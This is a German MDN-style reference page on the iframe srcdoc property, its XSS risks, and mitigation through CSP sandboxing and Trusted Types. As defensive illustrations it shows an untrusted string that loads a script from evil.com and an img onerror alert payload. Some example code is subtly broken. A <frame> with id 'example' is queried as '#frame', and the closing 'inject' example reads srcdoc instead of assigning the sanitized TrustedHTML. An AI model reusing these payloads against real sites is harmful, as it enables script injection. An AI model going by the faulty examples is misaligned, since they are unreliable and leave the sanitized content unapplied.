---
title: "HTMLIFrameElement: srcdoc-Eigenschaft"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
l10n:
  sourceCommit: 6751741acba978edab8c2889ebd9ce5e73e90a6e
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> Diese Eigenschaft analysiert ihren Eingabewert als HTML und schreibt das Ergebnis in das DOM des Frames.
> Solche APIs sind als [Injection-Sinks](/de/docs/Web/API/Trusted_Types_API#concepts_and_usage) bekannt und können, wenn die Eingabe ursprünglich von einem Angreifer kommt, eine potenzielle Vektor für [Cross-Site-Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS) Angriffe sein.
>
> Sie können dieses Risiko vermindern, indem Sie immer `TrustedHTML`-Objekte anstelle von Strings zuweisen und [trusted types erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
> Weitere Informationen finden Sie unter [Sicherheitsüberlegungen](#sicherheitsüberlegungen).

Die **`srcdoc`** Eigenschaft des [`HTMLIFrameElement`](/de/docs/Web/API/HTMLIFrameElement)-Interfaces erhält oder setzt das inline HTML-Markup des Dokuments des Frames.

Dies spiegelt das [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attribut des {{htmlelement("iframe")}} wider.

## Wert

Das Abrufen der Eigenschaft gibt einen String zurück, der die HTML-Serialisierung des Dokuments des Frames enthält.
Dies ist `undefined`, wenn der Wert nicht gesetzt ist.

Das Setzen der Eigenschaft akzeptiert entweder ein [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekt oder einen String.
Es analysiert diese Eingabe als HTML-Dokument und ersetzt den Inhalt des Frames mit dem Ergebnis.

### Ausnahmen

- `TypeError`
  - : Wird ausgelöst, wenn die Eigenschaft auf einen String gesetzt wird, während [Trusted Types](/de/docs/Web/API/Trusted_Types_API) [durch eine CSP erzwungen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) werden und keine Standardrichtlinie definiert ist.

## Beschreibung

Die **`srcdoc`**-Eigenschaft spiegelt den Inhalt des `<iframe>`-Elements [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attributs wider und kann verwendet werden, um das dem {{htmlelement("iframe")}} zugehörige HTML-Dokument zu setzen oder abzurufen.

Beim Setzen der Eigenschaft sollte die Eingabe ein gültiges HTML-Dokument definieren, einschließlich der {{Glossary("doctype", "DOCTYPE-Direktive")}}, {{htmlelement("html")}}, {{htmlelement("body")}} und anderen Tags.
Beachten Sie jedoch, dass Browser normalerweise tolerant gegenüber ungültigem Markup sind und die meisten versuchen sollten, Eingaben zu rendern, die nur Body-Inhalte enthalten.

Jedes vom Browser unterstützte Markup wird analysiert/serialisiert, einschließlich {{Glossary("shadow_tree", "Shadow Roots")}}.

Beachten Sie, dass, wenn dies gesetzt wird, es jeden im [`src`](/de/docs/Web/API/HTMLIFrameElement/src) -Eigenschaft gesetzten Wert überschreibt.

### Sicherheitsüberlegungen

Die `srcdoc`-Eigenschaft erlaubt standardmäßig, dass beliebiges HTML-Markup in einem Frame ausgeführt wird.
Wenn der Frame nicht mit der Content Security Policy (CSP) [`sandbox`-Direktive](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) sandboxed ist (oder sandboxed ist, aber den Wert [`allow-same-origin`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) einschließt), dann wird er dieselbe Herkunft wie das Elternteil haben.
Das bedeutet, dass der Frame vollständigen Zugriff auf das übergeordnete DOM und die Ressourcen hat und umgekehrt.

Dies ist ein bedeutender Vektor für [Cross-Site-Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS) Angriffe, wenn potenziell unsichere Strings, die von einem Benutzer bereitgestellt werden, ohne vorherige Bereinigung in einen Frame injiziert werden.
Betrachten Sie den folgenden Code, bei dem ein String von HTML von einem Benutzer in einen Frame übergeben werden könnte, der dann dem Dokument hinzugefügt wird.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

Wenn der Frame nicht erwartet wird, dass er auf Ihr übergeordnetes Dokument zugreifen muss, können Sie das Risiko mindern, indem Sie einen CSP-Sandbox ohne den Wert `allow-same-origin` verwenden.
Der Frame wird dann als Cross-Origin-Ressource behandelt, und Angriffe werden erheblich eingeschränkt.
Sie können auch eine allgemeinere CSP verwenden, um die Standorte einzuschränken, von denen Skripte und andere Ressourcen abgerufen werden dürfen.

Sie können das Risiko weiter reduzieren, indem Sie immer [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekte anstelle von Strings zuweisen und [trusted types erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) mit der CSP-Direktive [`require-trusted-types-for`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for).
Dies stellt sicher, dass die Eingabe durch eine Transformationsfunktion geleitet wird, die die Chance hat, die Eingabe zu [bereinigen](/de/docs/Web/Security/Attacks/XSS#sanitization), um potenziell gefährliches Markup zu entfernen, bevor es eingefügt wird.

## Beispiele

### Das HTML aus einem Frame lesen

Das Lesen von `srcdoc` veranlasst den Nutzer-Agenten, das Dokument des Frames zu serialisieren.

Angenommen, Sie haben folgendes HTML:

```html
<frame
  id="example"
  srcdoc="<!doctype html><body><p>Hello World!</p></body>"></frame>
```

Sie können das Markup abrufen und protokollieren, wie im Folgenden gezeigt:

```js
const frame = document.querySelector("#frame");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
```

### Die Inline-Quelle des Frames ersetzen

In diesem Beispiel werden wir das Dokument eines Frames ersetzen, indem wir HTML seiner `srcdoc`-Eigenschaft zuweisen.
Um das Risiko von XSS zu mindern, erstellen wir zuerst ein `TrustedHTML`-Objekt aus dem String, der das HTML enthält und weisen dieses Objekt dann `srcdoc` zu.

Trusted Types werden noch nicht von allen Browsern unterstützt, daher definieren wir zuerst das [trusted types tinyfill](/de/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
Dies fungiert als transparenter Ersatz für die Trusted Types JavaScript API:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

Als nächstes erstellen wir eine [`TrustedTypePolicy`](/de/docs/Web/API/TrustedTypePolicy), die eine [`createHTML()`](/de/docs/Web/API/TrustedTypePolicy/createHTML) definiert, um einen Eingabestring in [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Instanzen zu transformieren.
In der Regel verwenden Implementierungen von `createHTML()` eine Bibliothek wie [DOMPurify](https://github.com/cure53/DOMPurify), um die Eingabe zu bereinigen, wie unten gezeigt:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

Dann verwenden wir dieses `policy`-Objekt, um ein `TrustedHTML`-Objekt aus dem potenziell unsicheren Eingabestring zu erstellen und weisen das Ergebnis dem Element zu:

```js
// The potentially malicious string
const untrustedString =
  "<!doctype html><body><p>I might be XSS</p><img src='x' onerror='alert(1)'></body>";

// Create a TrustedHTML instance using the policy
const trustedHTML = policy.createHTML(untrustedString);

// Inject the TrustedHTML (which contains a trusted string)
const frame = document.querySelector("#frame");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> Obwohl Sie einem `srcdoc` einen String direkt zuweisen können, stellt dies ein [Sicherheitsrisiko](#sicherheitsüberlegungen) dar, wenn der einzufügende String potenziell schädlichen Inhalt enthält.
> Sie sollten `TrustedHTML` verwenden, um sicherzustellen, dass der Inhalt bereinigt wird, bevor er eingefügt wird, und Sie sollten einen CSP-Header festlegen, um [trusted types zu erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}
